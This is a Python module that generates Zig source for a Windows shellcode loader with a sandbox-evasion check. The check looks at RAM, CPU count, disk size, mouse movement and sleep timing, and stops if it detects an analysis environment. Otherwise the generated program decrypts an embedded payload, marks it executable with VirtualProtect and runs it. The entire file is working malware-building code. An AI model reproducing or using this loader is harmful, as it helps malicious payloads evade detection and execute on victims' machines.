#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Sandbox heuristics gate before shellcode execution — pure Zig."""

from __future__ import annotations

from lib.compile.injection_common import InjectionBuilder
from lib.compile.zig_loader_common import zig_decode_decrypt_preamble, zig_sleep_ms, zig_std_preamble


SANDBOX_ZIG = """
fn sandboxScore() u32 {
    var score: u32 = 0;
    var mem: w.MEMORYSTATUSEX = undefined;
    mem.dwLength = @sizeOf(w.MEMORYSTATUSEX);
    _ = GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys / (1024 * 1024 * 1024) < 4) score += 1;

    var sys: w.SYSTEM_INFO = undefined;
    GetSystemInfo(&sys);
    if (sys.dwNumberOfProcessors < 2) score += 1;

    var total: w.ULARGE_INTEGER = undefined;
    if (GetDiskFreeSpaceExA("C:\\\\", null, &total, null) != 0) {
        if (total.QuadPart / (1024 * 1024 * 1024) < 80) score += 1;
    }

    var p1: w.POINT = undefined;
    var p2: w.POINT = undefined;
    _ = GetCursorPos(&p1);
    Sleep(2000);
    _ = GetCursorPos(&p2);
    if (p1.x == p2.x and p1.y == p2.y) score += 1;

    const t0 = GetTickCount64();
    Sleep(3000);
    const t1 = GetTickCount64();
    if (t1 - t0 < 2500) score += 1;

    return score;
}
"""


class SandboxEvasionLoaderBuilder(InjectionBuilder):

    def __init__(self, *args, min_score: int = 2, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.min_score = max(1, int(min_score))

    def build_zig_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        decode = zig_decode_decrypt_preamble(encoded_payload, key, iv, cipher=self.cipher)
        return f"""
{zig_std_preamble()}
{decode}
{SANDBOX_ZIG}

pub fn main() u8 {{
    if (sandboxScore() >= {self.min_score}) return 0;

    var gpa = std.heap.GeneralPurposeAllocator(.{{}}){{}};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    const sc = decodeAndDecrypt(allocator) catch return 1;
    defer allocator.free(sc);

    const exec = VirtualAlloc(null, sc.len, w.MEM_COMMIT | w.MEM_RESERVE, w.PAGE_READWRITE) orelse return 1;
    @memcpy(@as([*]u8, @ptrCast(exec))[0..sc.len], sc);
    var old: w.DWORD = 0;
    if (VirtualProtect(exec, sc.len, w.PAGE_EXECUTE_READ, &old) == 0) return 1;
{zig_sleep_ms(self.sleep_ms)}
    const fn_ptr: *const fn () callconv(.c) void = @ptrCast(@alignCast(exec));
    fn_ptr();
    _ = VirtualFree(exec, 0, w.MEM_RELEASE);
    return 0;
}}
"""
